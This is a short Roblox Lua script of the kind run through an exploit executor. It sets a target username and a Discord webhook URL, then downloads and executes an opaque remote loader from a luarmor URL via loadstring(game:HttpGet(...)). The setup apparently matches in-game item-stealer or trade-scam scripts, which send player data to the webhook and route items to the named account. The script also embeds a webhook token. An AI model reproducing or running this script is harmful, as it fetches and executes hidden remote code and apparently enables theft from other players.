-- Mode: NORMAL
getgenv().TARGET_USERNAME = "PE_31365"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1557168290244333568/spS0EtIrn_0mC1d67AtRhtX3oS82iaDbThFT96JkX3mXYMYGSEmB37QtYs1bw2mxVFfQ"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)